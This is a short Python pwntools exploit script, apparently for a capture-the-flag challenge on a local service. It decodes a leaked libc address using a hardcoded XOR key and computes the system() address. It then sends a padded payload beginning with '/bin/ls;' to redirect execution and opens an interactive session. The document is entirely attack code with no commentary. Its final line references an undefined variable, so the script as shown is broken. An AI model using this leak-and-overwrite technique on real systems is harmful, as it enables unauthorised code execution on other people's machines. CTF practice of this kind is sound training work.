#!/usr/bin/env python2

from pwn import *

libc_system = 0x00044a60
libc_start_main = 0x0001eeb0
gamma = [ord(i) for i in list("13731337")]
sh = "/bin/ls;"


def main(b):  
    s = connect('127.0.0.1', 51001)  
    s.sendline("123")
    s.sendline("1")
    s.sendline("1")
    s.recvuntil("#")

    id_ = s.recvline()[:-2]
    leak = [id_[i:i+2] for i in range(0, len(id_), 2)]
    leak = int("".join([chr(int(leak[i], 16) ^ gamma[i]) for i in range(len(leak))]), 16)
    s.sendline("2")
    payload = sh + "%{}x".format(str(272-len(sh)))
    payload += p32(leak-249-libc_start_main+libc_system)
    s.sendline(payload)
    s.sendline("2")
    s.sendline("2")
    s.interactive()
    s.close()


if __name__ == "__main__":
    main(str(i))
